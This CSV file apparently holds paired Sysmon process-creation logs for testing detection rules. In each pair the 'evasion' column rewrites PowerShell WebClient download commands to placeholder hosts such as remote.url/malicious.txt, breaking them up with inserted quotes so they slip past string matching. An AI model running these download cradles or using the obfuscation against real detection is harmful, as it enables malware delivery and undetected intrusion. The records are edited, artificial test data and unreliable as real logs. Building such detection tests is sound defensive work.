Match Value,Evasion Value
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:15.312
ProcessGuid: {19FC45AC-74FF-601C-0000-00109F860200}
ProcessId: 2076
Image: C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe
FileVersion: 9.1.0.2009022700
Description: Adobe Acrobat SpeedLauncher
Product: Adobe Acrobat
Company: Adobe Systems Incorporated
OriginalFileName: AcroSpeedLaunch.exe
CommandLine: ""C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe"" 
CurrentDirectory: C:\Windows\system32\
User: CLIENT3\setup
LogonGuid: {19FC45AC-74FE-601C-0000-0020FD380200}
LogonId: 0x238fd
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=452FA961163EF4AEE4815796A13AB2CF,SHA256=14DC422082F96F5C21C41A5E5F6E8445547CC4B02B18F0A86A34669CA2CE18A7
ParentProcessGuid: {19FC45AC-74FE-601C-0000-0010D8530200}
ParentProcessId: 1572
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE","Process Create:
RuleName: 
UtcTime: 2021-02-04 20:34:49.227
ProcessGuid: {19FC45AC-5A69-601C-0000-001089681000}
ProcessId: 3212
Image: C:\Windows\System32\rundll32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\shell32.dll,OpenAs_RunDLL C:\ProgramData\winlogbeat\logs\winlogbeat
CurrentDirectory: C:\ProgramData\winlogbeat\logs\
User: client\breach
LogonGuid: {19FC45AC-53AD-601C-0000-002012560200}
LogonId: 0x25612
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=51138BEEA3E2C21EC44D0932C71762A8,SHA256=5AD3C37E6F2B9DB3EE8B5AEEDC474645DE90C66E3D95F8620C48102F1EBA4124
ParentProcessGuid: {19FC45AC-53AF-601C-0000-0010E7660300}
ParentProcessId: 1876
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
"{'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}, 'event_data': {'Description': 'Adobe Acrobat SpeedLauncher', 'Company': 'Adobe Systems Incorporated', 'IntegrityLevel': 'High', 'OriginalFileName': 'AcroSpeedLaunch.exe', 'FileVersion': '9.1.0.2009022700', 'TerminalSessionId': '1', 'Product': 'Adobe Acrobat', 'LogonId': '0x238fd', 'LogonGuid': '{19FC45AC-74FE-601C-0000-0020FD380200}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'computer_name': 'CLIENT3', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'opcode': 'Info', 'version': 5, 'record_id': 1233, 'process': {'pid': 1516, 'thread': {'id': 1780}}, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog'}","{'record_id': 1138, 'version': 5, 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT', 'api': 'wineventlog', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1524, 'thread': {'id': 1780}}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'opcode': 'Info', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_data': {'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'Description': 'Windows host process (Rundll32)', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'OriginalFileName': 'RUNDLL32.EXE', 'LogonId': '0x25612', 'TerminalSessionId': '1', 'LogonGuid': '{19FC45AC-53AD-601C-0000-002012560200}', 'IntegrityLevel': 'High'}}"
"{'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT3'}","{'mac': ['00:50:56:00:01:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'name': 'CLIENT', 'ip': ['192.168.56.254', '172.16.1.1', 'fe80::5efe:c0a8:38fe', 'fe80::5efe:ac10:101']}"
"{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:13.052Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}","{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T20:34:50.623Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1}"
"{'domain': 'CLIENT3', 'name': 'setup'}","{'domain': 'client', 'name': 'breach'}"
"{'hash': ['452fa961163ef4aee4815796a13ab2cf', '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'], 'user': 'setup'}","{'hash': ['51138beea3e2c21ec44d0932c71762a8', '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124'], 'user': 'breach'}"
"{'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT', 'ephemeral_id': '66b561db-e9d4-4076-b78e-c4ce9eada53c', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT'}"
2021-02-04T22:28:15.312Z,2021-02-04T22:27:18.718Z
"{'entity_id': '{19FC45AC-74FF-601C-0000-00109F860200}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'reader_sl.exe', 'pid': 2076, 'command_line': 'powershell.exe -C (New-Object System.Net.Webclient).DownloadFile(remote.url/malicious.txt, output.txt)', 'parent': {'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-74FE-601C-0000-0010D8530200}', 'pid': 1572, 'executable': 'C:\\Windows\\explorer.exe'}, 'args': ['C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe'], 'hash': {'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}}","{'entity_id': '{19FC45AC-74C6-601C-0000-0010E81B0100}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'name': 'spoolsv.exe', 'args': ['C:\\Windows\\System32\\spoolsv.exe'], 'pid': 1288, 'command_line': 'powershell.exe -C (New-""Object""     Net.Webclient).Down""loadS""tring(server.org/my.file)', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-74C3-601C-0000-0010D8620000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'hash': {'md5': '866a43013535dc8587c258e43579c764', 'sha256': 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82'}}"
"{'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}","{'sha256': 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82', 'md5': '866a43013535dc8587c258e43579c764'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:15.312
ProcessGuid: {19FC45AC-74FF-601C-0000-00109F860200}
ProcessId: 2076
Image: C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe
FileVersion: 9.1.0.2009022700
Description: Adobe Acrobat SpeedLauncher
Product: Adobe Acrobat
Company: Adobe Systems Incorporated
OriginalFileName: AcroSpeedLaunch.exe
CommandLine: ""C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe"" 
CurrentDirectory: C:\Windows\system32\
User: CLIENT3\setup
LogonGuid: {19FC45AC-74FE-601C-0000-0020FD380200}
LogonId: 0x238fd
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=452FA961163EF4AEE4815796A13AB2CF,SHA256=14DC422082F96F5C21C41A5E5F6E8445547CC4B02B18F0A86A34669CA2CE18A7
ParentProcessGuid: {19FC45AC-74FE-601C-0000-0010D8530200}
ParentProcessId: 1572
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:27:18.718
ProcessGuid: {19FC45AC-74C6-601C-0000-0010E81B0100}
ProcessId: 1288
Image: C:\Windows\System32\spoolsv.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Spooler SubSystem App
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: spoolsv.exe
CommandLine: C:\Windows\System32\spoolsv.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74C3-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=866A43013535DC8587C258E43579C764,SHA256=B2BE846B5167A2ECD1E30C69A81385FCC6EAE6033394D08458A5583D311C4D82
ParentProcessGuid: {19FC45AC-74C3-601C-0000-0010D8620000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}, 'event_data': {'Description': 'Adobe Acrobat SpeedLauncher', 'Company': 'Adobe Systems Incorporated', 'IntegrityLevel': 'High', 'OriginalFileName': 'AcroSpeedLaunch.exe', 'FileVersion': '9.1.0.2009022700', 'TerminalSessionId': '1', 'Product': 'Adobe Acrobat', 'LogonId': '0x238fd', 'LogonGuid': '{19FC45AC-74FE-601C-0000-0020FD380200}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'computer_name': 'CLIENT3', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'opcode': 'Info', 'version': 5, 'record_id': 1233, 'process': {'pid': 1516, 'thread': {'id': 1780}}, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog'}","{'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'process': {'pid': 1684, 'thread': {'id': 1512}}, 'event_id': 1, 'record_id': 1168, 'task': 'Process Create (rule: ProcessCreate)', 'opcode': 'Info', 'provider_name': 'Microsoft-Windows-Sysmon', 'api': 'wineventlog', 'computer_name': 'CLIENT', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'event_data': {'LogonGuid': '{19FC45AC-74C3-601C-0000-0020E7030000}', 'TerminalSessionId': '0', 'Company': 'Microsoft Corporation', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Product': 'Microsoft® Windows® Operating System', 'Description': 'Spooler SubSystem App', 'OriginalFileName': 'spoolsv.exe', 'LogonId': '0x3e7', 'IntegrityLevel': 'System'}, 'channel': 'Microsoft-Windows-Sysmon/Operational'}"
"{'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT3'}","{'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT', 'hostname': 'CLIENT1'}"
"{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:13.052Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}","{'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.121Z', 'module': 'sysmon', 'category': ['process']}"
"{'domain': 'CLIENT3', 'name': 'setup'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
"{'hash': ['452fa961163ef4aee4815796a13ab2cf', '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'], 'user': 'setup'}","{'hash': ['866a43013535dc8587c258e43579c764', 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82'], 'user': 'SYSTEM'}"
"{'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}","{'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2'}"
2021-02-04T22:28:15.312Z,2021-02-04T22:28:17.437Z
"{'entity_id': '{19FC45AC-74FF-601C-0000-00109F860200}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'reader_sl.exe', 'pid': 2076, 'command_line': 'powershell.exe -C (New-Object System.Net.Webclient).DownloadFile(remote.url/malicious.txt, output.txt)', 'parent': {'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-74FE-601C-0000-0010D8530200}', 'pid': 1572, 'executable': 'C:\\Windows\\explorer.exe'}, 'args': ['C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe'], 'hash': {'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}}","{'working_directory': 'C:\\Windows\\system32\\', 'parent': {'pid': 1564, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-7500-601C-0000-00100B520200}'}, 'args': ['C:\\Program Files\\NetTime\\NetTime.exe'], 'hash': {'md5': '60b65f97c12ba30cd36450d376227c02', 'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536'}, 'entity_id': '{19FC45AC-7501-601C-0000-0010CF860200}', 'pid': 2092, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe -C (New-Ob""je""ct    Net.We""bcl""ient).D""own""loa""dF""ile(somewhere.com/some.exe, output.exe)', 'name': 'NetTime.exe'}"
"{'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}","{'md5': '60b65f97c12ba30cd36450d376227c02', 'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:15.312
ProcessGuid: {19FC45AC-74FF-601C-0000-00109F860200}
ProcessId: 2076
Image: C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe
FileVersion: 9.1.0.2009022700
Description: Adobe Acrobat SpeedLauncher
Product: Adobe Acrobat
Company: Adobe Systems Incorporated
OriginalFileName: AcroSpeedLaunch.exe
CommandLine: ""C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe"" 
CurrentDirectory: C:\Windows\system32\
User: CLIENT3\setup
LogonGuid: {19FC45AC-74FE-601C-0000-0020FD380200}
LogonId: 0x238fd
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=452FA961163EF4AEE4815796A13AB2CF,SHA256=14DC422082F96F5C21C41A5E5F6E8445547CC4B02B18F0A86A34669CA2CE18A7
ParentProcessGuid: {19FC45AC-74FE-601C-0000-0010D8530200}
ParentProcessId: 1572
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:17.437
ProcessGuid: {19FC45AC-7501-601C-0000-0010CF860200}
ProcessId: 2092
Image: C:\Program Files\NetTime\NetTime.exe
FileVersion: 3.1.4.220
Description: Network Time Synchronizer
Product: NetTime
Company: 
OriginalFileName: NetTime.exe
CommandLine: ""C:\Program Files\NetTime\NetTime.exe"" 
CurrentDirectory: C:\Windows\system32\
User: CLIENT1\setup
LogonGuid: {19FC45AC-7500-601C-0000-0020BA3C0200}
LogonId: 0x23cba
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=60B65F97C12BA30CD36450D376227C02,SHA256=D06598F2F203CEC7A7A3857F727BC2BA457C1C0CEF2787B90CE553407FBF8536
ParentProcessGuid: {19FC45AC-7500-601C-0000-00100B520200}
ParentProcessId: 1564
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
"{'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}, 'event_data': {'Description': 'Adobe Acrobat SpeedLauncher', 'Company': 'Adobe Systems Incorporated', 'IntegrityLevel': 'High', 'OriginalFileName': 'AcroSpeedLaunch.exe', 'FileVersion': '9.1.0.2009022700', 'TerminalSessionId': '1', 'Product': 'Adobe Acrobat', 'LogonId': '0x238fd', 'LogonGuid': '{19FC45AC-74FE-601C-0000-0020FD380200}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'computer_name': 'CLIENT3', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'opcode': 'Info', 'version': 5, 'record_id': 1233, 'process': {'pid': 1516, 'thread': {'id': 1780}}, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog'}","{'channel': 'Microsoft-Windows-Sysmon/Operational', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'event_data': {'Product': 'NetTime', 'OriginalFileName': 'NetTime.exe', 'TerminalSessionId': '1', 'IntegrityLevel': 'High', 'Description': 'Network Time Synchronizer', 'LogonId': '0x23cba', 'LogonGuid': '{19FC45AC-7500-601C-0000-0020BA3C0200}', 'FileVersion': '3.1.4.220'}, 'event_id': 1, 'process': {'pid': 1504, 'thread': {'id': 1772}}, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'computer_name': 'CLIENT1', 'opcode': 'Info', 'version': 5, 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1233, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'}"
"{'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT3'}","{'architecture': 'x86', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'name': 'CLIENT1', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1'}"
"{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:13.052Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}","{'category': ['process'], 'type': ['start', 'process_start'], 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.131Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'module': 'sysmon'}"
"{'domain': 'CLIENT3', 'name': 'setup'}","{'domain': 'CLIENT1', 'name': 'setup'}"
"{'hash': ['452fa961163ef4aee4815796a13ab2cf', '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'], 'user': 'setup'}","{'user': 'setup', 'hash': ['60b65f97c12ba30cd36450d376227c02', 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536']}"
"{'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}","{'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2'}"
2021-02-04T22:28:15.312Z,2021-02-04T22:29:01.953Z
"{'entity_id': '{19FC45AC-74FF-601C-0000-00109F860200}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'reader_sl.exe', 'pid': 2076, 'command_line': 'powershell.exe -C (New-Object System.Net.Webclient).DownloadFile(remote.url/malicious.txt, output.txt)', 'parent': {'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-74FE-601C-0000-0010D8530200}', 'pid': 1572, 'executable': 'C:\\Windows\\explorer.exe'}, 'args': ['C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe'], 'hash': {'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}}","{'working_directory': 'C:\\Windows\\system32\\', 'name': 'services.exe', 'command_line': 'powershell.exe -C (New-O""bj""ect     S""yst""em.""Net"".W""eb""client).""Down""load""String""(remote.url/malicious.txt)', 'pid': 440, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'parent': {'executable': 'C:\\Windows\\System32\\wininit.exe', 'command_line': 'wininit.exe', 'name': 'wininit.exe', 'args': ['wininit.exe'], 'entity_id': '{19FC45AC-752D-601C-0000-001008590000}', 'pid': 348}, 'args': ['C:\\Windows\\system32\\services.exe'], 'hash': {'md5': '5f1b6a9c35d3d5ca72d6d6fdef9747d6', 'sha256': 'd7bc4ed605b32274b45328fd9914fb0e7b90d869a38f0e6f94fb1bf4e9e2b407'}, 'entity_id': '{19FC45AC-752D-601C-0000-0010F4630000}'}"
